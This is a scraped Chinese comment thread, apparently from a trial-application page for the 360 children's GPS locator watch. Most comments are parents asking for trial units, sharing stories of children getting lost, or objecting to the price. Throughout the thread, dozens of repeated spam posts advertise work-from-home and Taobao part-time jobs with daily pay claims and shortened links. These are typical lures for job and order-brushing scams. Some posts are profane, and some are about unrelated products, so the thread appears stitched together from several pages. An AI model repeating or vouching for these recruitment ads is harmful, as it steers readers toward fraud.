看了介绍，认为这个适合孩子，为了孩子的安全，真心希望得到一个。
挺实用的，什么时候出来呢？
360，期待，中国的谷歌
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O ～1 O O左右。（宝妈、学生、上班族都可以）有意者博客联系我 http://blog.sina.com.cn/s/blog_dd25d76b0101epe7.html   
我是单亲妈妈，六一节快到了，真想给孩子一件礼物
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O ～1 O O左右。（宝妈、学生、上班族都可以）有意者博客联系我 http://blog.sina.com.cn/s/blog_dd25d76b0101epe7.html   
你们咋不去抢，149人们币老子都嫌贵，还你妈的敢要美金，操
宝贝现在性格越来越独立，总想一个人坐她们学校的公交专线上下学，一方面我为她的独立自强风叫好，可另一方面我这当妈的确实不放心啊。之前用了儿童电话，可是老师、学校禁用不说，辐射也很让我不放心。看到这款儿童手表的介绍我真是一见倾心，恨不得立马让爱美的女儿戴上，这漂亮的外型估计她戴上就不会取下，呵呵。
祈祷我的孩子能为这一百个孩子里面的幸运儿,一定要通过评审哦,呵呵!
对这个产品真是望眼欲穿啊
试用机会来找我呀，会开心屎的，真心需要~
这样的产品真希望每个孩子都有一个，减少孩子的走丢。。。
非常喜欢，希望能申请到。赞！！！！！！！！！
149美金 你觉得你呢个消费得起 
期待  健康管理
来申请的，都是想要的，你是想让自己要，还是想让别人要？？ ，反正名额只有那么多，不增不减
很赞的想法，给力！
我想要一个给小孩试一下
求购，很早想买了
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O ～1 O O左右。（宝妈、学生、上班族都可以）有意者博客联系我 http://blog.sina.com.cn/s/blog_dd25d76b0101epe7.html
希望申请到，不错的产品
好像实用性不大，跟直接插在插座没什么区别似的
看介绍很实用，如果真的这么强大，必须要有一个！
真贵啊！758的不能开放下么
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O ～1 O O左右。（宝妈、学生、上班族都可以）有意者博客联系我 http://blog.sina.com.cn/s/blog_dd25d76b0101epe7.html 
之前宝宝在超市差点走失，急死一家人了。想买个防走失带，但总觉得跟牵条狗似的不够尊重孩子。真是希望能得到这个东西。
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O ～1 O O左右。（宝妈、学生、上班族都可以）有意者博客联系我 http://blog.sina.com.cn/s/blog_dd25d76b0101epe7.html 
希望能给孩子申请到一个，能时间还能定位，找孩子就不用费那么大的劲了，还能给孩子一个惊喜手表。
希望能得到
这款手表很符合如今父母的需求，非常想申请试用一下。
想使用看看，还是有用的。
手表是可以拿掉的
给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班 族都可以）【http://t.cn/8spTPuL】复制到浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～ 
有孩子，就需要这样的产品。
希望能给孩子申请到一个，能时间还能定位，找孩子就不用费那么大的劲了，还能给孩子一个惊喜手表。
这么好的产品啊！希望能够给我侄子带来帮助！
给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班 族都可以）【http://t.cn/8spTPuL】复制到浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～ 
我小孩就快读1年级了，可以让她认识时间
防水吗？？？？ 
申请一下，要是试用不中的话希望360改进成功以后可以尽快售卖，还有，电池的续航问题解决的怎么样了
希望从它开始孩子可以独自出门，妈妈也不必忧心匆匆，给亲子之间一份隐秘的保护
前几天一个奶奶买菜把孙子弄丢了，忒危险了，想想我们小时候都是自己上下学，那个时候人际关系都真诚，现在……
这玩意和滤水的差不多 不怕贵 效果好 耐用就行  一年不超过1000块钱 基本都不难接受  尤其是水 简直都没法食用了   
非常喜欢，可以给孩子和一个安全和感情上的互动。支持
给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班 族都可以）【http://t.cn/8spTPuL】复制到浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～ 
申请成功申请成功申请成功申请成功申请成功申请成功申请成功申请成功,不过确实设计能不容易被发现的样子比较好还是那种能随便放哪个地方都行的那种。
家有小女娃一名，天天操心，希望能申请到一个。
太想要这款手表了，希望幸运击中我！！！！！！！！！！！
作为一位妈妈，我想要一个~
特别希望能申请一个,好长时间没回家看到女儿了,送个惊喜给她,谢谢!
这个产品如果价格定得合理,应该市场广阔!
就记得我小时候喜欢到人家串门，刚上小学一天中午放学和同学一路回家，那时候家就住学校对面，我跟同学一起绕了个大圈子,经过他家时他妈妈认识我妈妈，我就不客气地在人家蹭了午饭。80年代固定电话还没普及，妈妈不知道找了多少地方才找到我，那会儿妈妈肯定还没吃饭，我是门也串了、饭也蹭了，还能在别人家被妈妈找到，一脸的满意。现在想想，真是不养儿不知父母恩啊……
很需要，我家小孩太调皮，老是小孩乱跑
挺好的产品
孩子成为每个家庭的重中之重，孩子的安全基于首位，为了第一时间了解到孩子的方位，所以希望申请一个。谢谢！！！
可能又要抢购的节奏~
阻断数据流出。。。尼玛十年前西门子就做到了好吧，充电线、数据线同一根，有开关控制数据连接
真心想要一个给孩子,谢谢啦!!!
儿子好动，有个这个给我们父母增加了安全感
这个真可以有
这个玩意有啥用 ？？？？？？？
看介绍是个不错的东西啊
早就该有这么个东东了，什么时候上市啊？
给狗做脖套还行  不怕丢
400mah还能让手机用2个小时？蓝牙一直开着，400mah能坚持多久？吹牛逼也靠点谱吧！
希望不会太贵
产品出来后,我第一时间购买....
小孩子没人带我又在上班，他平时都是一个在家，好不放心
看上去不错
宝贝越来越独立了，但是担心确是越来越多了。非常喜欢，希望能申请到！
3000贵？网上卖一个都最少5000 一般都7000
什么时候能出来，对于我这种经常找不到手机的非常实用
真心不错的东西，要一个试试呗
看起来非常不错啊！高&quot;达&quot;上！
是全英文的啊？希望可以有中文版本呢
希望能添加一个电话功能就更完美了
我有类似产品现货。需要了解加Q47074368联系 
希望申请成功
很喜欢，女儿喜欢蓝色的，希望能抢到个~嘿嘿
看上去好高端的样子，不知道实用性怎么样哇
给孩子安上定位，知道孩子行踪，对上班族非常重要，期待
很方便，很实用。有创意。
很赞，有音乐更好，这样跑步就一个智能环搞定，可以音乐，可以测心率，可以计量跑的公里。
高上大啊，不错不错
应该很好用，申请一个试试
应该很好用，申请一个试试 
看了介绍就觉得让家长很放心，真想使用一下哟。家有男宝，希望可以得到个蓝色的。
是不是可以运用到以后的游戏中去 把自己投影到游戏中真人战斗一样啊
期望好久了，希望能试用上哦
在父母上班的时候，给在外面上学或者春游的孩子带上，知道她的行踪是非常好的
孩子经常一个人跑出去玩，很不放心，很希望可以申请到一个。这样的haunted，我上班也可以试试掌握到孩子的具***置。不需要太担心了。
产品单价贵了,要是便宜的话,应该很快普及.这是入门及的智能家居.挺好的.
很喜欢，不知价格几何？
我真心觉得这个东东不错啊 
对家长来说，有了这个真的可以省不少心。支持~
这种产品，以后会是一种趋势，看了介绍之后很心动，也已经填写申请了，希望自己好运
希望申请成功 儿子五周岁了特别调皮 挺让人不放心的  我也可以买
外观好棒，喜欢
360的周到  让我们放心  希望自己好运
公公是老年痴呆病人，经常走失，很希望可以申请到一个，这样可以放上上班了！
希望能有试用的机会，本打算给儿子买一块的，如果申请不到，就买一块吧，孩子安全最重要
我是一个360人 支持360产品。
对啊，有这么一个产品真的是太棒了，不过材料之类的一定要对宝宝无伤害哦，价格不要太高，希望可以试用到哦，谢谢产家生产这么好的产品
期待，正好可以给宝贝当六一节礼物。
真的可以省不少心呀！好期待能抽到啊！
总是担心，孩子还小，一次去超市不知会跑了去拿酸奶，吓的我快崩溃了，去商场也乱跑，现在有这定位手表太好了，小孩喜欢就会带，我定位她就放心了，我想试用，谢谢
申请的人好多呀！
天下父母的心都是一样的，但是没有真正经历过的人真的无法体会孩子对你的重要性！
支持360，周总很亲民，知道我们所需，为人民服务~
期待啊，好东西
如果没有申请到，我还是会购买的。看起来挺不错，以防小孩走丢。
不便宜呢吧
太有爱的产品了，价格不要太高，希望可以试用到哦，谢谢产家生产这么好的产品 
支持~对家长来说，有了这个真的可以省不少心。
真精辟11
确实期待，谢谢360！！
一如既往的支持360，希望早日上市，给孩子买一个
真心好东东，我能免费试用是不要想了，从来没有中过奖，希望正式上市的价格不要太离谱。199就好。
看了价格，就提不起兴趣
不错的东西，希望有更多室用的产品推出
给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班 族都可以）【http://t.cn/8spTPuL】复制到浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～ 
给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班 族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～ 
高大上的产品啊，360想得很周到。家里是个男宝还在小学，不可能让带随身手机，现在正是淘的年龄，写完作业就不知道跑哪里玩去了，虽然都是在一个家属院，我挨家挨户的找孩子别人家也会烦，有了这个就好了，随时可以知道孩子在哪里。希望我能申请到~谢谢
我也要360 手表
高大上的产品啊，360想得很周到。家里是个男宝还在小学，不可能让带随身手机，现在正是淘的年龄，写完作业就不知道跑哪里玩去了，虽然都是在一个家属院，我挨家挨户的找孩子别人家也会烦，有了这个就好了，随时可以知道孩子在哪里。希望我能申请到~谢谢 
很期待啊！奶奶有老年痴呆 经常走失，每次都要花好长时间寻找。有这种手表真是太好了，不仅弟弟妹妹可以用，爷爷奶奶、外婆也能用了。
不错啊，期待能孩子一个
给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班 族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～
宝宝几次都跟着陌生人跑出去，好怕他会走丢
能防水吗？
希望申请成功 儿子三周岁了特别调皮 挺让人不放心的 我也可以买
希望我能得到使用机会，以后妈妈再也不用担心孩子走丢啦~~
给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班 族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～  
给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班 族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～  
支持360会更好
500我要了 
给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班 族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～  
很可爱的手表，希望可以试用。
期待中。。。。
期待中。。。。
支持！！！
刷广告的死全家
保护儿子的安全。想要！
给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班 族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～  
给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班 族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～  
给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班 族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～  
很可爱的造型，估计孩子们会喜欢，孩子一直嚷嚷着买手机，希望这款可以暂时满足的他的愿望呢，已经申请试用了，希望可以得到机会哦
很可爱的手表，希望可以试用
这次机会真的很难得，可以体会新技术带给宝宝和家人的安全保障。期待完美绽放
期待。。。
多少钱啊 好想买啊
希望我能跟我宝贝抢到一个哦
申请试用，孩子刚上一年级，安全问题很重要，申请试用！
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～ 
刚刚今天买了一台！之前没看到有试用的！可惜了！
在銀行見過，但不知道是否真的可以超越掃描儀。不過可以為很多需要錄入資料的部門進一步提高效率！
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～ 
大妈，你电影看多了吧。2斤的东西你揣兜里试试看！ 你忘了什么叫手机？微型相机？
真的很不错，很适合宝宝使用。希望能够抽到免费试用。多多支持，希望能够有更好的产品推出。
这个办公室用的，***什么的，不行啊！太大了 
光听说不信，需要验证
确实不错，有黑的就好了，另外有些贵哦！
能申请到吗？也是抱着试试看的心情来玩下，估计没戏！
工厂直销插卡打电话智能手表，扣扣：422859717
只想知道，how much
要是再安上一个小摄像头能看到他周围的场景就更好了。
cha, 儿童卫士1都没有公开发售，2又来了？？
推你了嘻嘻嘻
正准备买这个，什么时候开始发售
希望可以试用哦
希望可以申请到试用，真的很好的
这个不错的说
非常好的设计，满满的体现出家长对孩子时时刻刻的关注，支持~
360儿童卫士2是让家长省心的好产品。，希望自己有好运。
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～  
看了可以定位材料无毒。超级喜欢。希望可以抽到一个试用一下！！！
快快量产，再等孩子都大了！
如果抽不到的话，不知道在哪里可以购买！
这个实用啊，袜子什么的真的懒得洗……
希望获得试用的机会
我喜欢这有录音功能。
好想中一个
为小宝贝申请一个
研究关于GPS方面产品的
我喜欢这个的精准定位及录音功能。最重要的还是安全无毒。希望能为孩子抽一个。
有了这个以后，外婆带着宝宝出门就不怕找不到了！！！
有点贵昂，看着挺喜欢的
马上六一的，很好的礼物啊，中一个吧
很喜欢这款儿童定位手表的设计，这样就再也不用担心找不着宝贝了。
以后会给使吗
孩子特好动，带孩子出去玩，一不小心就跑出我的视线范围，经常吓个半死。有这样一款产品质量可靠技术可靠，是巴巴嘛嘛的福音啊！
希望能够获得一次机会
给小女儿申请一个，2岁了，正好用上，期待中
这样不用担心，钥匙找不到，儿子现在是淘气的年龄总是把钥匙扔来扔去，这款产品真好
好想要一个，主要是看中了这款的定位功能！
好喜欢，所以，一定不要贵哦
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～ 
给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【dwz.cn/gkvFd】复制到浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～
续航和防水怎么样都不说下
希望可以抢到，当作孩子六一的礼物
希望为我家宝贝申请一个，现在的城市太大了，有时候逛商场也会把孩子转晕了。定位准确，而且还有远程监控功能，都让我很中意。希望可以获得。期待ing
该产品不错，如果能让患有老人痴呆的老人使用那就更好了。有定位这样就不怕走失，很有市场。
希望能够获得一次机会 
我也想申请一个
他觉得这款手表很酷
已经六万多人申请了，我就不惨呼了，坐等你们生产出保质保量的好产品，我好给孩子买一部。希望价格不要太贵呦
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～
关注中.........
没有时间接送baby,难免担心路上安全，用上这款定位手表，在单位上就能了
希望我也能获得一次机会 
很好，非常实用，很有买一个的必要 
看上去真不错
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～ 
支持360会更好 
顺便补充一下。家长对孩子的关爱是无限的，虽然他们经常会忽略老人的感受，希望你们可以做出防水防震的老年版，这样孩子老人都可以使用。不得不说这个创意的确很有价值。
放学后不能偷溜去游戏厅了
拥有辐射有多少
放学后不能偷溜去游戏厅了！！！！
已经申请了，不知有没有机会和孩子一起体验360为我们带来的高科技产品。  非常非常地期待……
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～ 
我想给我的宝贝儿子申请一个。谢谢！
为了孩子还是申请一下吧。。。虽然知道概率渺茫。。。也要试试。。。
很赞，有音乐更好，这样跑步就一个智能环搞定，可以音乐，可以测心率，可以计量跑的公里。 
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～  
好喜欢这类东西啊，我是个丢三落四的人，感觉有了这类产品真的少了好多麻烦
期待早日上市，人活着健康最重要......
这款手表真的是爸爸妈妈们的期待。
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～
期待。。。
现在正需要这样的产品，希望能申请成功！
宝宝和淘气，出去玩、逛商场看宝宝都好累，她一直跑来跑去的，如能获得这款定位表，想大人没那么累，这样就会经常带着宝宝玩，宝宝也会很开心。
我喜欢这款
很期待给孩子佩戴一款
为了自家的孩子，拿个家长不心疼啊，小编辛苦你了. 希望你们研发成功，大家推荐些给朋友. 关注下360儿童卫士
360好多产品都很前卫，用过随身WIFI很好用走在行业的前列，支持有创意的好东东，但品质也很关键，不要用不久的便宜货，要经久耐用一点。
这么好的表，可以增加孩子很多安全因素，谢谢商家发明的手表。我想给我大儿子和小儿子都申请一个  谢谢！
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～ 
我十分想要两个这块表哦！想给两个女儿一人一块，希望可以申请到！谢谢！
我想给自己的女儿申请一个。宝贝儿，爸爸爱你！
送给宝贝的最好六一礼物，就是安全。
我想试用！谢谢！
希望孩子可以佩戴期待中.....
漂亮，大方，值得拥有
孩子们的安全的健康
哇，高大上。
我想要申请一个给自己，谢谢！
用脚踩的自行车，可以一边踩一边冲电哪才爽啊。
我十分想要两个这块表哦！
想给女儿试试，在外面不放心啊，我们长期在外工作，女儿由爷爷奶奶带着，可怜的留守儿童啊！
好喜欢的说
300之内吧
价格有点贵
很期待哦.但愿好动的儿子有福享用.我也可以省心了.
楼主是来炫耀硬笔的么？我感觉那个两元更加符合我的 要求
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～  
啥时候有的买啊？
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～  
想给女儿一个 祝全天下的小盆友儿童节快乐
只支持iphone5,不喜欢
给儿子申请一个，人多的地方相对放心点~~
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～  
谢谢 申请啊 好用一定购买
这款手表真的是爸爸妈妈们的期待
要是我儿子有一块这样的表就好了·今年夏天就不怕找不到人了·
什么时候能购买，好期待
不知道除了好看实不实用啊
调皮的孩子，有这可省不少心！
豪爽的说,我喜欢,一定要快点出来啊
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～  
出来后一定要买
真的好期待，有这个我就安心不少了呢
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客报名 http://t.cn/8sseZN4【复制到地址栏打开】
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～  
期待 好东西省心
某某某某某某  
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客报名 http://t.cn/8sseZN4【复制到地址栏打开】 z
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客报名 http://t.cn/8sseZN4【复制到地址栏打开】 q
这个太牛了吧！？简直无敌啊！赞一个！！！
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客报名 http://t.cn/8sseZN4    【复制到地址栏打开】. 
希望能免费试用，马上就要六一儿童节了，希望能有个惊喜！端午+儿童节，双节快乐！
很爽,估计要很多的money吧
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客报名 http://t.cn/8sseZN4【.复制到地址栏打开】
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～  
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客报名 http://t.cn/8sseZN4【复制到地址栏打开】
但使用价值不大,不是太实用
真心太贵了    应该没有几个人会买吧
应该是很实用的宝贝
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客报名 http://t.cn/8sseZN4【复制到地址栏打开】..
很期待，何时有售呀？
祝儿子61快乐
 宝宝一定很喜欢，希望可以中~~
很想要,看着也舒服
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客报名 http://t.cn/8sseZN4【复制到地址栏打开】..
太帅了吧   不可思议
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客报名 http://t.cn/8sseZN4【复制到地址栏打开】!
好像要一个，有了他儿子就不会找不到了
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客报名 http://t.cn/8sseZN4【复制到地址栏打开】@
360，这就是我爱你的地方，你总是能和我的想法不谋而合
酷,黑,这是第一眼的感觉
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客报名 http://t.cn/8sseZN4【复制到地址栏打开】#
便宜的就好了。
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客报名 http://t.cn/8sseZN4【复制到地址栏打开】#!
感觉有点小
车还是不错的，创意也很好，就是价格贵，这绝对不是普通人能买的起的.....
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客报名 http://t.cn/8sseZN4【复制到地址栏打开】!@
等太久了，到底什么时候可以量产出售呢？？？
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客报名 http://t.cn/8sseZN4【复制到地址栏打开】~
便宜点           就好了 
我想有一个
很显眼,也很亮
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客报名 http://t.cn/8sseZN4【复制到地址栏打开】~1
绝对的高大上...
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～  
什么时候有售？最好价格亲民，让一般的家庭也用起，让家人放心。
可以降低近视度吗、、？
到时可以免费试用吗
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～  
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】~!@
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～  
手机，电脑，只要有你的地方，我都装上你了，快点出现吧，我们都在期盼。
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】.
很期待啊。应该会很实用吧 
不错的发明，对家有儿女的父母是个很好的帮助！
给予的意见 1.夏天到了 希望手表可以透气一点 不然长时间的闷在那里容易长痱子 也会有异味 2.现在孩子都有自己的审美观一般的东西都不要戴在身上 所以希望可以弄点孩子喜欢的卡通图案在上面 吸引孩子 
都拥有，很困难。
好运来吧，为我的宝贝保驾护航，来吧，来吧
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】.
价格确实贵~换成人民币有可能考虑~
不会分离的感觉。我想试用，谢谢
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～  
期待 好东西省心 
蛮有创意，只是价格不太亲民，放弃！！！！！期待价格下跌到合适价格。
我想要一个
奇酷官方试用群 256161928  这个是不是官方群  那个王八蛋踢我出去的 我要是有不良言论  踢我心服口服  NND  没有理由  我就回复个表情  给我个说法   大爷的
真的很期待，一直想有款这样的产品。我家熊孩子比较调皮，我又是做生意的，一般都是自己带。有一次跑不见了，急的我哭，发动了一个商场的人去找，最终在楼下找到！所以有了这款产品就少一份担心
想试试到底好不好，是不是真的
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】..
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8sseZN4【复制到地址栏打开】...
好创意，好想法，但是价格的确是贵些，看到介绍就想一出来肯定要买个试试，但一看价格就彻底放弃了。
